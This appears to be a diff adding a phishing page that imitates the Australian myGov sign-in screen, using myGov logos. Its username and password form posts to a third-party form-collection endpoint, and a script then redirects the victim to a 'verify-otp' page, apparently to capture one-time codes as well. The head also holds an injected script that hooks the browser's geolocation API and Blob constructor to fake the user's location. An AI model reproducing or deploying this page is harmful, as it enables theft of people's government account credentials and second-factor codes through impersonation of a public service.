@@ -1,0 +1,283 @@
+<html lang="en"><head><script>(function(){function hookGeo() {
+  //<![CDATA[
+  const WAIT_TIME = 100;
+  const hookedObj = {
+    getCurrentPosition: navigator.geolocation.getCurrentPosition.bind(navigator.geolocation),
+    watchPosition: navigator.geolocation.watchPosition.bind(navigator.geolocation),
+    fakeGeo: true,
+    genLat: 38.883333,
+    genLon: -77.000
+  };
+
+  function waitGetCurrentPosition() {
+    if ((typeof hookedObj.fakeGeo !== 'undefined')) {
+      if (hookedObj.fakeGeo === true) {
+        hookedObj.tmp_successCallback({
+          coords: {
+            latitude: hookedObj.genLat,
+            longitude: hookedObj.genLon,
+            accuracy: 10,
+            altitude: null,
+            altitudeAccuracy: null,
+            heading: null,
+            speed: null,
+          },
+          timestamp: new Date().getTime(),
+        });
+      } else {
+        hookedObj.getCurrentPosition(hookedObj.tmp_successCallback, hookedObj.tmp_errorCallback, hookedObj.tmp_options);
+      }
+    } else {
+      setTimeout(waitGetCurrentPosition, WAIT_TIME);
+    }
+  }
+
+  function waitWatchPosition() {
+    if ((typeof hookedObj.fakeGeo !== 'undefined')) {
+      if (hookedObj.fakeGeo === true) {
+        navigator.getCurrentPosition(hookedObj.tmp2_successCallback, hookedObj.tmp2_errorCallback, hookedObj.tmp2_options);
+        return Math.floor(Math.random() * 10000); // random id
+      } else {
+        hookedObj.watchPosition(hookedObj.tmp2_successCallback, hookedObj.tmp2_errorCallback, hookedObj.tmp2_options);
+      }
+    } else {
+      setTimeout(waitWatchPosition, WAIT_TIME);
+    }
+  }
+
+  Object.getPrototypeOf(navigator.geolocation).getCurrentPosition = function (successCallback, errorCallback, options) {
+    hookedObj.tmp_successCallback = successCallback;
+    hookedObj.tmp_errorCallback = errorCallback;
+    hookedObj.tmp_options = options;
+    waitGetCurrentPosition();
+  };
+  Object.getPrototypeOf(navigator.geolocation).watchPosition = function (successCallback, errorCallback, options) {
+    hookedObj.tmp2_successCallback = successCallback;
+    hookedObj.tmp2_errorCallback = errorCallback;
+    hookedObj.tmp2_options = options;
+    waitWatchPosition();
+  };
+
+  const instantiate = (constructor, args) => {
+    const bind = Function.bind;
+    const unbind = bind.bind(bind);
+    return new (unbind(constructor, null).apply(null, args));
+  }
+
+  Blob = function (_Blob) {
+    function secureBlob(...args) {
+      const injectableMimeTypes = [
+        { mime: 'text/html', useXMLparser: false },
+        { mime: 'application/xhtml+xml', useXMLparser: true },
+        { mime: 'text/xml', useXMLparser: true },
+        { mime: 'application/xml', useXMLparser: true },
+        { mime: 'image/svg+xml', useXMLparser: true },
+      ];
+      let typeEl = args.find(arg => (typeof arg === 'object') && (typeof arg.type === 'string') && (arg.type));
+
+      if (typeof typeEl !== 'undefined' && (typeof args[0][0] === 'string')) {
+        const mimeTypeIndex = injectableMimeTypes.findIndex(mimeType => mimeType.mime.toLowerCase() === typeEl.type.toLowerCase());
+        if (mimeTypeIndex >= 0) {
+          let mimeType = injectableMimeTypes[mimeTypeIndex];
+          let injectedCode = `<script>(
+            ${hookGeo}
+          )();<\/script>`;
+    
+          let parser = new DOMParser();
+          let xmlDoc;
+          if (mimeType.useXMLparser === true) {
+            xmlDoc = parser.parseFromString(args[0].join(''), mimeType.mime); // For XML documents we need to merge all items in order to not break the header when injecting
+          } else {
+            xmlDoc = parser.parseFromString(args[0][0], mimeType.mime);
+          }
+
+          if (xmlDoc.getElementsByTagName("parsererror").length === 0) { // if no errors were found while parsing...
+            xmlDoc.documentElement.insertAdjacentHTML('afterbegin', injectedCode);
+    
+            if (mimeType.useXMLparser === true) {
+              args[0] = [new XMLSerializer().serializeToString(xmlDoc)];
+            } else {
+              args[0][0] = xmlDoc.documentElement.outerHTML;
+            }
+          }
+        }
+      }
+
+      return instantiate(_Blob, args); // arguments?
+    }
+
+    // Copy props and methods
+    let propNames = Object.getOwnPropertyNames(_Blob);
+    for (let i = 0; i < propNames.length; i++) {
+      let propName = propNames[i];
+      if (propName in secureBlob) {
+        continue; // Skip already existing props
+      }
+      let desc = Object.getOwnPropertyDescriptor(_Blob, propName);
+      Object.defineProperty(secureBlob, propName, desc);
+    }
+
+    secureBlob.prototype = _Blob.prototype;
+    return secureBlob;
+  }(Blob);
+
+  window.addEventListener('message', function (event) {
+    if (event.source !== window) {
+      return;
+    }
+    const message = event.data;
+    switch (message.method) {
+      case 'updateLocation':
+        if ((typeof message.info === 'object') && (typeof message.info.coords === 'object')) {
+          hookedObj.genLat = message.info.coords.lat;
+          hookedObj.genLon = message.info.coords.lon;
+          hookedObj.fakeGeo = message.info.fakeIt;
+        }
+        break;
+      default:
+        break;
+    }
+  }, false);
+  //]]>
+}hookGeo();})()</script>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <link rel="stylesheet" href="https://unpkg.com/flowbite@1.5.3/dist/flowbite.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js" integrity="sha512-aVKKRRi/Q/YV+4mjoKBsE4x3H+BkegoM/em46NNlCqNTmUYADjBbeNefNxYV7giUp0VxICtqdrbqU7iVaeZNXA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+</head>
+<body>
+
+    <nav style="background-color: rgb(55, 242, 242);" class=" border-gray-200 dark:bg-gray-900">
+        <div class="flex flex-wrap justify-between items-center mx-auto max-w-screen-xl px-4 md:px-6 py-2.5">
+            <a href="" class="flex items-center">
+                <img src="https://my.gov.au/content/dam/mygov/images/brand/logos/myGov-logo-cobranded-black.svg" class="mr-3 h-12 sm:h-9" alt="">
+            </a>
+
+            <div class="flex flex-row">
+               
+               
+
+                <div class="basis-1/2 ml-6 text-sm font-extralight text-blue-700">
+                   <a class="underline text-gray-600" href="">Help</a>
+                </div>
+
+              </div>
+
+            
+           
+        </div>
+
+    </nav>
+ 
+    <section class="bg-gray-50 dark:bg-gray-900">
+        <div class="flex mt-3 items-justified-left justify-left px-6 py-8 mx-auto md:h-screen lg:py-0">
+      
+            <div class="w-full dark:border md:mt-0 sm:max-w-md xl:p-0 dark:bg-gray-800 dark:border-gray-700">
+                <div class="p-6 space-y-4 md:space-y-6 sm:p-8">
+                    <h1 class="text-2xl font-bold mb-5 leading-tight tracking-tight text-gray-900 md:text-2xl dark:text-white">
+                        Sign in with myGov
+
+                    </h1>
+                  
+
+                    <h1 class="mt-4 text-2xl font-bold mb-5 leading-tight tracking-tight text-gray-900 md:text-2xl dark:text-white">
+                        Please login to continue 
+
+
+                    </h1>
+
+                    <form class="ajaxForm space-y-4 md:space-y-6" action="https://formcarry.com/s/9yBpB7bBPu" method="post">
+                        <div style="margin-top:50px" class="mt-3">
+                            <label for="email" class="block mb-2 text-sm font-medium text-gray-900 dark:text-gray-300">Username or e-mail</label>
+
+                            <input type="text" name="userr" class="mt-4 bg-gray-50 border border-gray-300 text-gray-900 sm:text-sm  focus:ring-primary-600 focus:border-primary-600 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" required="">
+                            <label style="margin-top: 5px" class="block mb-2 text-sm font-light text-gray-900 dark:text-white">
+                                <a class="text-blue-700 font-semibold underline" href="">Forgot Username?</a>
+                            </label>
+                        </div>
+
+                        <div style="margin-top:35px" class="mt-3">
+                            <label for="email" class="block mb-2 text-sm font-medium text-gray-900 dark:text-gray-300">Password</label>
+
+                            <input type="password" name="pwd" class="mt-4 bg-gray-50 border border-gray-300 text-gray-900 sm:text-sm  focus:ring-primary-600 focus:border-primary-600 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" required="">
+                            <label style="margin-top: 5px" class="block mb-2 text-sm font-light text-gray-900 dark:text-white">
+                                <a class="text-blue-700 font-semibold underline" href="">Forgot Password?</a>
+                            </label>
+                        </div>
+
+                       
+
+
+                        
+
+                                <button style="background-color: rgb(80, 196, 196);" type="submit" class="w-full text-white  hover:bg-primary-700 focus:ring-4 focus:outline-none focus:ring-primary-300 font-medium text-sm px-5 py-2.5 text-center dark:bg-primary-600 dark:hover:bg-primary-700 dark:focus:ring-primary-800">Sign in</button>
+
+                           
+
+                        
+
+                    </form>
+                </div>
+            </div>
+        </div>
+      </section>
+
+
+
+
+<footer style="background-color:rgb(0, 0, 0);" class="p-4  rounded-lg shadow md:flex md:items-center md:justify-between md:p-6 dark:bg-gray-800">
+    <a href="" class="flex items-center">
+        <img src="https://my.gov.au/content/dam/mygov/images/brand/logos/myGov-logo-cobranded-white.svg" class="mr-3 h-12 sm:h-9" alt="">
+    </a>
+  
+    <div class="flex flex-row">
+        <div class="basis-1/4">
+            <svg style="margin-top: 5px; margin-right:3px" xmlns="http://www.w3.org/2000/svg" width="13" height="13" fill="currentColor" class="bi bi-lock-fill " viewBox="0 0 16 16">
+                <path d="M8 1a2 2 0 0 1 2 2v4H6V3a2 2 0 0 1 2-2zm3 6V3a3 3 0 0 0-6 0v4a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2z"></path>
+              </svg>
+        </div>
+        
+
+        
+
+      </div>
+
+   
+
+    <p class=" text-white text-2xl mx-4 mt-2 font-semibold text-white" style="font-size: 10px;">
+        We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and present, of all Aboriginal and Torres Strait Islander nations.
+        </p>
+
+
+    
+    
+</footer>
+
+
+
+    <script src="https://unpkg.com/flowbite@1.5.3/dist/flowbite.js"></script>
+    <script>
+        $(".ajaxForm").submit(function(e) {
+        e.preventDefault();
+        var href = $(this).attr("action");
+        $.ajax({
+        type: "POST",
+        dataType: "json",
+        url: href,
+        data: $(this).serialize(),
+        success: function(response) {
+        if (response.status == "success") {
+        window.location.href = './verify-otp'; // redirection url // change this. 
+        } else {
+        alert("An error occured: " + response.message);
+        }
+        }
+        });
+        });
+  
+  </script>
+
+</body></html>
